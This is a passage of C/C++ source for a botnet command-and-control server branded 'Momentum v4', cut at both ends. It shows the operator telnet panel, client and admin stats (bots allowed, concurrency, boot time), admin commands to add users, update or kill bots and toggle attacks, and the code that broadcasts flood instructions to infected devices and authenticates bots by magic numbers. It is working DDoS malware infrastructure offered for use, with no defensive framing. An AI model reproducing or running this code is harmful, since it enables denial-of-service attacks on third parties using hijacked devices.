                send(fd, "                                                                \e[31;1m#######\r\n", strlen("                                                                \e[31;1m#######\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m                   #                                            \e[31;1m##\e[37;1mO\e[31;1m#\e[37;1mO\e[31;1m##\r\n", strlen("\e[36;1m                   #                                            \e[31;1m##\e[37;1mO\e[31;1m#\e[37;1mO\e[31;1m##\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m  ######          ###                                           \e[31;1m#\e[37;1mVVVVV\e[31;1m#\r\n", strlen("\e[36;1m  ######          ###                                           \e[31;1m#\e[37;1mVVVVV\e[31;1m#\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##             #                                          \e[31;1m##  \e[37;1mVVV  \e[31;1m##\r\n", strlen("\e[36;1m    ##             #                                          \e[31;1m##  \e[37;1mVVV  \e[31;1m##\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##         ###    ### ####   ###    ###  ##### #####     \e[31;1m#          ##\r\n", strlen("\e[36;1m    ##         ###    ### ####   ###    ###  ##### #####     \e[31;1m#          ##\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##        #  ##    ###    ##  ##     ##    ##   ##      \e[31;1m#  \e[38;5;81;41mMomentum\e[0m  \e[31;1m##\r\n", strlen("\e[36;1m    ##        #  ##    ###    ##  ##     ##    ##   ##      \e[31;1m#  \e[38;5;81;41mMomentum\e[0m  \e[31;1m##\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##       #   ##    ##     ##  ##     ##      ###        \e[31;1m#     \e[38;5;81;41mv4\e[0m     \e[0m\e[31;1m###\r\n", strlen("\e[36;1m    ##       #   ##    ##     ##  ##     ##      ###        \e[31;1m#     \e[38;5;81;41mv4\e[0m     \e[0m\e[31;1m###\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##          ###    ##     ##  ##     ##      ###       \e[31;1mQQ#           ##Q\r\n", strlen("\e[36;1m    ##          ###    ##     ##  ##     ##      ###       \e[31;1mQQ#           ##Q\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##       # ###     ##     ##  ##     ##     ## ##    \e[31;1mQQQQQQ#       #QQQQQQ\r\n", strlen("\e[36;1m    ##       # ###     ##     ##  ##     ##     ## ##    \e[31;1mQQQQQQ#       #QQQQQQ\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m    ##      ## ### #   ##     ##  ###   ###    ##   ##   \e[31;1mQQQQQQQ#     #QQQQQQQ\r\n", strlen("\e[36;1m    ##      ## ### #   ##     ##  ###   ###    ##   ##   \e[31;1mQQQQQQQ#     #QQQQQQQ\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[36;1m  ############  ###   ####   ####   #### ### ##### #####   \e[31;1mQQQQQ#######QQQQQ\r\n\r\n", strlen("\e[36;1m  ############  ###   ####   ####   #### ### ##### #####   \e[31;1mQQQQQ#######QQQQQ\r\n\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(data == "Default" || data == "default")
            {
              send(fd, "\033[2J\033[H                   Successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n", strlen("\033[2J\033[H                   Successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n"), MSG_NOSIGNAL);
              sleep(1);
              send(fd, "                         \e[37;1m* \e[31;1mWelcome into Momentum V4\e[37;1m *\e[0m\r\n", strlen("                         \e[37;1m* \e[31;1mWelcome into Momentum V4\e[37;1m *\e[0m\r\n"), MSG_NOSIGNAL);
              sleep(1);
              send(fd, "                         \e[31;1mType '\e[36;1mhelp\e[31;1m' for display menu \e[37;1m!\e[0m\r\n", strlen("                         \e[31;1mType '\e[36;1mhelp\e[31;1m' for display menu \e[37;1m!\e[0m\r\n"), MSG_NOSIGNAL);
              sleep(1);
              send(fd, "                    \e[31;1mAttacking governemental website = \e[91mBAN !\e[0m\r\n", strlen("                    \e[31;1mAttacking governemental website = \e[36;1mBAN !\e[0m\r\n"), MSG_NOSIGNAL);
              sleep(1);
              send(fd, "                             \e[31;1mAttacks Status: \e[32mDisabled\r\n\r\n", strlen("                             \e[31;1mAttacks Status: \e[32mEnabled\r\n\r\n"), MSG_NOSIGNAL);
              send(fd, "        \e[31;1mMessage of the day: \e[37;1m", strlen("        \e[31;1mMessage of the day: \e[37;1m"), MSG_NOSIGNAL);
              send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
              send(fd, "\r\n\r\n", 4, MSG_NOSIGNAL);
              continue;
                } 

                if(data == "Bitcoin" || data == "bitcoin")
                {
                        send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
                        send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                        send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                        send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                        send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                        send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                        send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                        send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                        continue;
                }

            
                if((data == "my statistics") && login.admin == 0)   
                {   
                    std::stringstream mystats_stream;
                    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
                    sprintf(banner1,  "\033[33;1m                                  __�������__\r\n");
                    sprintf(banner2,  "\033[33;1m                                _��\033[33;1m  _\033[33;1m _\033[33;1m    ��_\r\n");
                    sprintf(banner3,  "\033[33;1m                                �\033[33;1m   ������_\033[33;1m   �\r\n");
                    sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> �\033[33;1m    �____�\033[33;1m   � < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
                    sprintf(banner5,  "\033[33;1m                                �\033[33;1m    �\033[33;1m    �\033[33;1m   � \r\n");
                    sprintf(banner6,  "\033[33;1m                                ��_\033[33;1m ������\033[33;1m  _��\r\n");
                    sprintf(banner7,  "\033[33;1m                                  ���_____���\r\n\r\n");

                    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);

                    mystats_stream << "\r\n\e[38mUsername: \e[37;1m" << login.username;
                    mystats_stream << "\r\n\e[38mRank: \e[37;1mClients"; 
                    mystats_stream << "\r\n\e[38mDevices online: \e[37;1m" << count;
                    mystats_stream << "\r\n\e[38mDevices allowed: \e[37;1m " << maxclikos; 
                    mystats_stream << "\r\n\e[38mConcurrent allowed: \e[37;1m" << concurrent_user; 
                    mystats_stream << "\r\n\e[38mCooldown:\e[37;1m " << cooldown; 
                    mystats_stream << "\r\n\e[38mMax boot time:\e[37;1m " << time_boot; 
                    mystats_stream << "\r\n\r\n"; 
                    send(fd, mystats_stream.str().c_str(), mystats_stream.str().length(), MSG_NOSIGNAL);
                    continue;
                }

                if(data == "quit")
                {
                    send(fd, "\e[91mAdios!\r\n", strlen("\e[91mAdios!\r\n"), MSG_NOSIGNAL);
                    sleep(0.5);
                    close(fd);
                }

                if((data == "my statistics") && login.admin == 1)
                {

                      std::stringstream mystats_stream;
                      send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
                      sprintf(banner1,  "\033[33;1m                                  __�������__\r\n");
                      sprintf(banner2,  "\033[33;1m                                _��\033[33;1m  _\033[33;1m _\033[33;1m    ��_\r\n");
                      sprintf(banner3,  "\033[33;1m                                �\033[33;1m   ������_\033[33;1m   �\r\n");
                      sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> �\033[33;1m    �____�\033[33;1m   � < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
                      sprintf(banner5,  "\033[33;1m                                �\033[33;1m    �\033[33;1m    �\033[33;1m   � \r\n");
                      sprintf(banner6,  "\033[33;1m                                ��_\033[33;1m ������\033[33;1m  _��\r\n");
                      sprintf(banner7,  "\033[33;1m                                  ���_____���\r\n\r\n");

                        send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                        send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                        send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                        send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                        send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                        send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                        send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);

                        mystats_stream << "\r\n\e[38musername: \e[37;1m" << login.username;
                        mystats_stream << "\r\n\e[38mrank: \e[37;1madministrator"; 
                        mystats_stream << "\r\n\e[38mdevices online: \e[37;1m" << count;
                        mystats_stream << "\r\n\e[38mdevices allowed: \e[37;1m Unlimited"; 
                        mystats_stream << "\r\n\e[38mconcurrent allowed: \e[37;1m" << concurrent_user; 
                        mystats_stream << "\r\n\e[38mcooldown:\e[37;1m " << cooldown; 
                        mystats_stream << "\r\n\e[38mmax boot time:\e[37;1m Unlimited"; 
                        mystats_stream << "\r\n\r\n"; 
                        send(fd, mystats_stream.str().c_str(), mystats_stream.str().length(), MSG_NOSIGNAL);
                        continue;
                    }

                //Start Update
                if(data == "update" && login.admin == 1 && count > 0)
                {                        
                                send(fd, "\033[37;1mBots updated successfuly\r\n", strlen("\033[37;1mBots updated successfuly\r\n"), MSG_NOSIGNAL);
                                update_bots(&process);
                                continue;
                }

                if(data == "update" && login.admin == 1 && count == 0)
                {
                                send(fd, "\033[37;1mImpossible to update.\r\n", strlen("\033[37;1mImpossible to update.\r\n"), MSG_NOSIGNAL);
                                continue;
                }
                if(data == "update" && login.admin == 0)
                {
                                continue;
                }
                //End Update

                //Start BOTKILL
                if(data == "botkill" && login.admin == 1 && count > 0)
                {                        
                                send(fd, "\033[37;1mKilling all current running processes\033[38;5;220m!\r\n", strlen("\033[37;1mKilling all current running processes\033[38;5;220m!\r\n"), MSG_NOSIGNAL);
                                kill_self(&process);
                                continue;
                }
                if(data == "botkill" && login.admin == 1 && count == 0)
                {
                                send(fd, "\033[37;1mImpossible to kill.\r\n", strlen("\033[37;1mImpossible to kill.\r\n"), MSG_NOSIGNAL);
                                continue;
                }
                if(data == "botkill" && login.admin == 0)
                {
                                continue;
                }
                //End BOTKILL

                if(data == "bots")
                {
                    std::stringstream count_stream;

                    count_stream << "\e[31;1m Bots Loaded\e[0m\e[38;5;25m: " << count;
                    count_stream << "\r\n\e[37m Your maximum Allowed Bots\e[0m\e[31m: " << maxclikos;

                    count_stream << "\r\n";

                    send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
                    continue;
                }

                if(data == "mastercls") 
                {
                    send(fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"), MSG_NOSIGNAL);
                    continue;
                }

        if((data == "clear") && login.admin == 1) 
        {
          send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
          sprintf(banner1,  "\033[33;1m                                  __�������__\r\n");
          sprintf(banner2,  "\033[33;1m                                _��\033[33;1m  _\033[33;1m _\033[33;1m    ��_\r\n");
          sprintf(banner3,  "\033[33;1m                                �\033[33;1m   ������_\033[33;1m   �\r\n");
          sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> �\033[33;1m    �____�\033[33;1m   � < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
          sprintf(banner5,  "\033[33;1m                                �\033[33;1m    �\033[33;1m    �\033[33;1m   � \r\n");
          sprintf(banner6,  "\033[33;1m                                ��_\033[33;1m ������\033[33;1m  _��\r\n");
          sprintf(banner7,  "\033[33;1m                                  ���_____���\r\n\r\n");

            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
            send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "                                \e[37;1mRank: \e[38;5;25mAdmin\r\n\e[32;1m", strlen("                                  \e[37;1mRank: \e[38;5;25mAdmin\r\n\e[32;1m"), MSG_NOSIGNAL);
            send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
            send(fd, "\r\n", 2, MSG_NOSIGNAL);

            continue;
        }


        if((data == "clear") && login.admin == 0) 
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
          sprintf(banner1,  "\033[33;1m                                  __�������__\r\n");
          sprintf(banner2,  "\033[33;1m                                _��\033[33;1m  _\033[33;1m _\033[33;1m    ��_\r\n");
          sprintf(banner3,  "\033[33;1m                                �\033[33;1m   ������_\033[33;1m   �\r\n");
          sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> �\033[33;1m    �____�\033[33;1m   � < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
          sprintf(banner5,  "\033[33;1m                                �\033[33;1m    �\033[33;1m    �\033[33;1m   � \r\n");
          sprintf(banner6,  "\033[33;1m                                ��_\033[33;1m ������\033[33;1m  _��\r\n");
          sprintf(banner7,  "\033[33;1m                                  ���_____���\r\n\r\n");

            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
            send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "                                \e[37;1mRank: \e[38;5;25mclient\r\n\e[32;1m", strlen("                                  \e[37;1mRank: \e[38;5;25mclient\r\n\e[32;1m"), MSG_NOSIGNAL);
            send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
            send(fd, "\r\n", 2, MSG_NOSIGNAL);
            continue;
        }
            if(data == "admin panel" && login.admin == 0){

                send(fd, "\033[91mSorry, invalid command.", strlen("\033[91mSorry, invalid command."), MSG_NOSIGNAL);
                continue;
            }

            if(data == "admin panel" && login.admin == 1){
                    send(fd, "\e[2J\e[H", strlen("\e[2J\e[H"), MSG_NOSIGNAL);
                    sprintf(banner1,  "\033[33;1m                                  __�������__\r\n");
                    sprintf(banner2,  "\033[33;1m                                _��\033[33;1m  _\033[33;1m _\033[33;1m    ��_\r\n");
                    sprintf(banner3,  "\033[33;1m                                �\033[33;1m   ������_\033[33;1m   �\r\n");
                    sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> �\033[33;1m    �____�\033[33;1m   � < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
                    sprintf(banner5,  "\033[33;1m                                �\033[33;1m    �\033[33;1m    �\033[33;1m   � \r\n");
                    sprintf(banner6,  "\033[33;1m                                ��_\033[33;1m ������\033[33;1m  _��\r\n");
                    sprintf(banner7,  "\033[33;1m                                  ���_____���\r\n\r\n");

                    send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                    send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                    send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                    send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                    send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                    send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                    send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                    send(fd, "\t\e[31;1madministrator panel\r\n", strlen("\t\e[31;1madministrator panel\r\n"), MSG_NOSIGNAL);

                    send(fd, "\r\n\e[37;1m- \e[37;1mavailable current command \e[37;1m-\r\n", strlen("\r\n\e[37;1m- \e[37;1mavailable current command \e[37;1m-\r\n"), MSG_NOSIGNAL);
                    
                    send(fd, "\e[38;5;25musers stats             -    \e[37;1msee all users status\r\n",           strlen("\e[38;5;25musers stats             -    \e[37;1msee all users status\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers add               -    \e[37;1madd user in database\r\n",           strlen("\e[38;5;25musers add               -    \e[37;1madd user in database\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers remove            -    \e[37;1mremove user in database\r\n",        strlen("\e[38;5;25musers remove            -    \e[37;1mremove user in database\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers update-bots       -    \e[37;1mupdate user bots\r\n",               strlen("\e[38;5;25musers update-bots       -    \e[37;1mupdate user bots\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers update-conc       -    \e[37;1mupdate user concurrent\r\n",         strlen("\e[38;5;25musers update-conc       -    \e[37;1mupdate user concurrent\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers update-time       -    \e[37;1mupdate user time\r\n",               strlen("\e[38;5;25musers update-time       -    \e[37;1mupdate user time\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers update-cooldown   -    \e[37;1mupdate user cooldown\r\n",           strlen("\e[38;5;25mcient update-cooldown   -    \e[37;1mupdate user cooldown\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers <enable/disable>  -    \e[37;1mban or un-ban user\r\n",             strlen("\e[38;5;25musers <enable/disable>  -    \e[37;1mban or un-ban user\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25musers logs              -    \e[37;1msee all userss logs\r\n",            strlen("\e[38;5;25musers logs              -    \e[37;1msee all userss logs\r\n"), MSG_NOSIGNAL);
                    send(fd, "\e[38;5;25mattack debug            -    \e[37;1msee all current running flood\r\n",  strlen("\e[38;5;25mattack debug            -    \e[37;1msee all current running flood\r\n"), MSG_NOSIGNAL);
                continue;
            }


        if (split(data, ' ').size() > 0 && login.admin == 1)
        {
            if (split(data, ' ')[0] == "users")
            {
                if (split(data, ' ').size() > 1)
                {

                    if(split(data, ' ')[1] == "show")
                    {
                        mysql_get_client_information(&login);
                        continue;
                    }

                    if(split(data, ' ')[1] == "enable" || split(data, ' ')[1] == "disable")
                    {
                        if (split(data, ' ').size() > 2)
                        {
                            if(strlen(split(data, ' ')[2].c_str()) > 0)
                            {
                                mysql_update_disable(&login, split(data, ' ')[2].c_str(), (split(data, ' ')[1] == "enable" ? 0 : 1));
                                continue;
                            }
                        }

                        std::string info = "Usage: enable/disable [username]\r\n";
                        send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                    }

                    if(split(data, ' ')[1] == "add")
                    {
                        if (split(data, ' ').size() != 10)
                        {
                            std::string info = "Usage: client add [user] [pass] [max bots] [max time] [cooldown] [conc] 0 0\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        
                        mysql_add_user(&login, split(data, ' ')[2].c_str(), split(data, ' ')[3].c_str(), 
                                        atoi(split(data, ' ')[4].c_str()), atoi(split(data, ' ')[5].c_str()), 
                                            atoi(split(data, ' ')[6].c_str()), atoi(split(data, ' ')[7].c_str()), 
                                                atoi(split(data, ' ')[8].c_str()), atoi(split(data, ' ')[8].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-bots")
                    {

                        if(split(data, ' ').size() != 4)
                        {
                            std::string info = "\033[37;1mUsage: client update-bots [username] [bots count]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_update_users_bots(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-time")
                    {

                        if(split(data, ' ').size() != 4)
                        {
                            std::string info = "\033[37;1mUsage: client update-time [username] [max boot time]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;
                        
                        mysql_update_users_time(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-conc")
                    {

                        if(split(data, ' ').size() != 4)
                        {
                            std::string info = "\033[37;1mUsage: client update-conc [username] [concurrent]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_update_users_conc(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "update-cooldown")
                    {

                        if(split(data, ' ').size() != 4)
                        {
                            std::string info = "\033[37;1mUsage: client update-cooldown [username] [cooldown]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_update_users_cooldown(&login, split(data, ' ')[2].c_str(), atoi(split(data, ' ')[3].c_str()));

                    }

                    if(split(data, ' ')[1] == "remove")
                    {
                        if (split(data, ' ').size() != 3)
                        {
                            std::string info = "Usage: clients remove [username]\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }

                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_remove_user(&login, split(data, ' ')[2].c_str());

                    }
                }

                continue;
            }

        }


        if(data == "bots arch")
        { 
            std::map<std::string, int> stats;
            std::map<std::string, int>::iterator stats_iterator;
            std::stringstream stats_stream;

            stats = statistics();

            if(stats.empty())
            {
                send(fd, "No devices connected for view statistics :(\r\n", 45, MSG_NOSIGNAL);
                continue;
            }

            stats_stream << "\r\n";

            for(stats_iterator = stats.begin(); stats_iterator != stats.end(); stats_iterator++)
            {
                stats_stream << "\e[37;1m" << stats_iterator->first << "\e[37;1m: \e[31m" << stats_iterator->second;
                stats_stream << "\r\n";
            }

            stats_stream << "\r\n";

            send(fd, stats_stream.str().c_str(), stats_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if((data == "attacks enable"))
        {
            send(fd, "\e[32m        attacks has been enabled successfuly.\r\n", 53, MSG_NOSIGNAL);
            global_attack_status = TRUE;
            continue;
        }
        else if((data == "attacks disable"))
        {
            send(fd, "\e[31m        attacks has been disabled successfuly.\r\n", 53, MSG_NOSIGNAL);
            global_attack_status = FALSE;
            continue;
        } 
        else if(global_attack_status == FALSE)
        {
            send(fd, "\e[31mattacks has been disabled for maintenance.\r\n", 49, MSG_NOSIGNAL);
            continue;
        }
        //Flooding management END.

        if(count == 0)
        {
            //send(fd, "\033[37mNo clients connected to command\033[97m!\r\n", strlen("\033[37mNo clients connected to command\033[97m!\r\n"), MSG_NOSIGNAL);
            continue;
        }
        process.buf = data;
        process.buf_len = data.length();
        process.fd = fd;
        process.ptr = &login;
        process.count = login.max_clients;
        std::stringstream info_stream;

 
        if(data[0] == '��')
        {
            if(!parse_count(&process))
            {
                send(fd, "\033[37;1mInvalid count specified\033[37;1m!\r\n", strlen("\033[37;1mInvalid count specified\033[37;1m!\r\n"), MSG_NOSIGNAL);
                continue;
            }
            process.buf = process.f;
        }
        ptr = command_process(&process);
        if(!ptr)
        {
            continue;
        }
        info_stream << " \033[32mBroadcasted instructions to " << (process.count == -1 ? count : process.count) << " devices.\r\n";
        send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);

        flood(ptr, &process);
        free(ptr->buf);
        free(ptr);
    }
    
    //User close the CNC
    ConnectedUser--;
    mysql_update_login(&login, 0);
    pthread_cancel(counter);
    close(fd);
    pthread_exit(0);
}

static void accept_admin_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;
    tdata.fd = fd;

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, admin, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    return;
}

static void verify_client(struct epoll_event *es, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    uint8_t core_count;
    uint8_t ram_count;

    char *buf;
    char *cbuf;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);
    if(b1 != 66 && b2 != 51 && b3 != 99 && b4 != 456 && b5 != 764 && b6 != 73)
    {
        return;
    }

    cbuf = data->buf;
    buf = data->buf;
    len = *(uint16_t *)buf;
    len = ntohs(len);

    if(len > sizeof(data->buf))
    {
        return;
    }

    buf += sizeof(uint16_t);

   /*memcpy(&ram_count, buf, sizeof(uint8_t)); 
    client_list[es->data.fd].ram_count = ram_count;*/
    //ramCount a faire plus-tard

    memcpy(&core_count, buf, sizeof(uint8_t)); 
    client_list[es->data.fd].core_count = core_count;

    client_list[es->data.fd].arch_len = len;
    memcpy(client_list[es->data.fd].arch, sizeof(uint8_t) + buf, client_list[es->data.fd].arch_len); 
    
    client_list[es->data.fd].authenticated = TRUE;
    printf("\033[37;1m[\033[32;1m+\033[37;1m] (\033[35;1m%d\033[37;1m.\033[35;1m%d\033[37;1m.\033[35;1m%d\033[37;1m.\033[35;1m%d\033[37;1m:\033[34;1m%s\033[37;1m) - \e[035m core count: \e[037m[\e[031m%d\033[0m]\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch, client_list[es->data.fd].core_count);
    return;
}



static void parse_command(int fd, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 == 8890 && b2 == 5412 && b3 == 6767 && b4 == 1236 && b5 == 8092 && b6 == 3334)
    {
        send(fd, data, sizeof(struct relay), MSG_NOSIGNAL);
    }

    return;
}

static void process_event(struct epoll_event *es, int efd)
{
    int len = 0;
    struct relay data;

    memset(&data, 0, sizeof(struct relay));

    if((es->events & EPOLLERR) || (es->events & EPOLLHUP) || (!(es->events & EPOLLIN)))
    {
        //printf("\e[38;5;25m[-]\e[97m Connection terminated. (%d.%d.%d.%d)\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
        terminate_client(es->data.fd);
        return;
    }

    if(es->data.fd == admin_fd)
    {
        accept_admin_connection(es, efd);
        return;
    }

    if(es->data.fd == client_fd)
    {
        accept_client_connection(es, efd);
        return;
    }

    errno = 0;
    // Always read in
    len = recv(es->data.fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

    if(len <= 0)
    {
        terminate_client(es->data.fd);
        //lenerror
        return;
    }

    if(data.type == TYPE_AUTH && !client_list[es->data.fd].authenticated)
    {
        verify_client(es, &data);
    }

    if(!client_list[es->data.fd].authenticated)
    {
        terminate_client(es->data.fd);
        return;
    }

    client_list[es->data.fd].timeout = time(NULL);

    if(data.type == TYPE_COMMAND)
    {
        parse_command(es->data.fd, &data);
    }

    return;
}

static void *client_timeout(void *arg)
{
    int i = 0;

    while(TRUE)
    {
        for(i = 0; i < MAX_BOTS; i++)
        {
            if(!client_list[i].connected || !client_list[i].authenticated)
                continue;
            if(!client_list[i].authenticated && client_list[i].timeout + VERIFY_TIMEOUT < time(NULL))
            {
                printf("Client timed out on the verification process (%d.%d.%d.%d)\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }
            if(client_list[i].timeout + TIMEOUT < time(NULL))
            {
                //printf("\e[31m[-]\e[97m Connection timeout. (%d.%d.%d.%d)\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }
        }

        sleep(1);
    }
}

static void client_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!client_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLIENT_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(client_fd);
    REUSE_ADDR(client_fd);

    ret = bind(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }

    ret = listen(client_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }

    return;
}

static void epoll_handler(void)
{
    int ret = -1;
    int x = 0;
    //int efd = -1;
    struct epoll_event client_event;
    struct epoll_event admin_event;
